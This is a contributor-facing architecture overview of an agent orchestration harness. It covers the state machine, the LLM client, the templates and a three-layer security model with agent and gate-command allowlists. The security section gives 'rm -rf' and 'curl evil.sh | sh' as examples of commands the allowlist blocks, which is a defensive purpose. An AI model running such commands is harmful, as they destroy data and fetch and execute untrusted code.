# Radiant Harness — Architecture

> Audience: contributors who want to understand *why* the code is shaped the
> way it is, before changing it. Read this before opening a PR.

## Why a harness, not just a scaffold

A **scaffold** is a feed-forward system: you generate files (spec, tasks,
skills, CLAUDE.md), the agent reads them, the agent does the work. There is
no loop back. If the agent forgets an AC, writes broken tests, or invents
behavior outside scope, you find out by hand.

A **harness** adds the feedback side:
- it parses the spec into a contract (ACs with Given/When/Then)
- it executes the implementation
- it runs the gates
- if the gates fail, it asks the agent to fix and re-tries
- it tracks state across sessions so a long feature survives a `/clear`

That's the difference. Radiant Harness is the latter — the part that
actually *closes the loop* — wrapped in a Go binary you can ship.

## Layered design

```
                          ┌──────────────────────┐
                          │      cmd/radiant     │   cobra CLI
                          └──────────┬───────────┘
                                     │
        ┌────────────────────────────┼────────────────────────────┐
        ▼                            ▼                            ▼
┌──────────────┐           ┌──────────────────┐          ┌──────────────────┐
│   scaffold   │           │      engine      │          │     quality      │
│              │           │                  │          │                  │
│ init/update  │           │ Run(specDir)     │          │ Audit            │
│ adapter view │           │ orchestrates     │          │ Fidelity         │
│ template emb │           │ LLM-API mode     │          │ Mermaid          │
└──────────────┘           │                  │          │ Validate (gates) │
                           └────────┬─────────┘          └──────────────────┘
                                    │
                          ┌─────────▼──────────┐
                          │      harness       │   the feedback loop
                          │                    │
                          │ Orchestrator       │   ← gates + auto-correct
                          │ Validator          │   ← isolated context
                          │ State              │   ← crash-safe persistence
                          │ Context            │   ← RPI budget
                          │ Tokens             │   ← word-aware estimator
                          │ Agent (runner)     │   ← allowlist + timeout
                          │ Log                │   ← slog JSON
                          │ Protocols          │   ← 6 adapter protocols
                          └────────────────────┘
                                    │
                          ┌─────────▼──────────┐
                          │        llm         │   universal client
                          │                    │
                          │ OpenRouter         │
                          │ OpenAI             │
                          │ Anthropic          │
                          │ Custom BaseURL     │
                          └────────────────────┘
                                    │
                          ┌─────────▼──────────┐
                          │       spec         │   parsers
                          │                    │
                          │ spec.md            │
                          │ tasks.md           │
                          └────────────────────┘
```

The `engine` and `harness.Orchestrator` are siblings: `engine` calls the
LLM API directly (no agent binary required), `harness.Orchestrator`
shells out to an installed agent (any of `claude`, `codex`, `copilot`,
`cursor`, `gemini`). `cmd/radiant` exposes both through the same
`radiant run` command — pick with `--provider=` (engine path) or omit
(orchestrator path). Vendor-neutral: no agent is privileged.

## State machine

Eight states with explicit allowed transitions:

```
idle → research → plan → implement → validate → done
                  ↑        ↓           ↓
                  └──── correcting ←──┘
                              ↓
                            failed
```

`State.Transition` enforces the allowed transitions; an invalid jump
(e.g. `idle → done`) is rejected with a clear error. The state is
persisted to `.radiant-harness/progress.json` atomically (write-temp +
fsync + rename), and concurrent `radiant run` invocations on the same
project serialize through an advisory flock on `.radiant-harness/lock`.

## Security model

Three layers, defense-in-depth:

1. **Agent binary allowlist** — `internal/harness/agent.go`. The
   `AgentRunner` refuses to spawn anything outside
   `{claude, codex, copilot, cursor, gemini}`. Adding a new adapter is
   an explicit edit here, not a config knob — the harness deliberately
   doesn't auto-discover arbitrary CLIs.

2. **Gate command allowlist** — `internal/quality/validate.go` and
   `internal/engine/engine.go`. Tasks.md gates are tokenized and each
   binary must be in the closed set (`node`, `npm`, `pnpm`, `yarn`, `go`,
   `make`, `pytest`, `cargo`, etc.). A spec can't smuggle `rm -rf` or
   `curl evil.sh | sh` into a gate.

3. **Path sandboxing** — `pathIsSafe` in `engine.go`. Code blocks
   emitted by the LLM are checked against the project directory before
   being written; any path that escapes is rejected with a clear error.

Every shell exec has a context-bound timeout (10 min for agents, 5 min
for gates) so a hung dependency can't stall the harness.

## Concurrency model

- **Parallel tasks within a phase** use goroutines capped by a
  semaphore (`MaxParallelTasks = 4`) so we don't burst provider rate
  limits. Cancellation propagates through `context.Context`.
- **Phase ordering** is sequential — phases run one after another.
- **State writes** go through `State.mu` (intra-process) and
  `flock(2)` (inter-process). Atomic rename means a crash mid-write
  can't leave a torn JSON.

## LLM client

A thin wrapper over OpenAI-compatible `/chat/completions`:

- **Presets** — 10 curated model IDs covering Anthropic, OpenAI, Google,
  DeepSeek, and Xiaomi. Pin a preset, override the API key, done. Any
  vendor not listed can be added by editing `PresetModels` in
  `internal/llm/client.go`.
- **Retry** — exponential backoff with full jitter on 5xx, fail-fast on
  4xx. 4 attempts total. The user can tell the difference between
  "provider blip" (retried) and "bad prompt" (surfaced verbatim).
- **Streaming** — SSE-aware, 1 MB scan buffer for long single chunks.
  Reconnect mid-stream is intentionally not supported — losing already-
  generated tokens to retry would confuse the caller more than
  re-prompting helps.

## Templates as content, not code

The 15 skills, 7 spec templates, and the golden example all live under
`internal/scaffold/templates/` as Markdown, embedded into the binary via
`go:embed`. They're content, not code: a spec change is a text edit, no
recompile, no rebuild of the engine.

The 6 agent adapters (`internal/scaffold/adapters.go`) translate the
canonical content into each agent's native format — Claude Code's
`CLAUDE.md` + `.claude/skills/` directory layout, Gemini's TOML with
`${` escaping, Codex's `AGENTS.md`, Cursor's `AGENTS.md`, Copilot's
config, Windsurf's `.windsurfrules`. None of these formats is canonical
to the harness — the canonical form is the templates themselves, and
each adapter is a projection.

## What this codebase is *not*

- **Not a chatbot.** There's no chat loop, no memory of past conversations
  beyond the JSON state file.
- **Not autonomous.** Every state transition either happens because of an
  explicit command or because the orchestrator is in the middle of
  executing one. A `radiant run` that gets cancelled mid-task leaves
  state consistent (last Save + advisory lock release).
- **Not a model router.** LLM selection is the operator's choice
  (`radiant config --model=…`). The harness doesn't pick "Opus for plan,
  Sonnet for implement" automatically — that's a future feature.
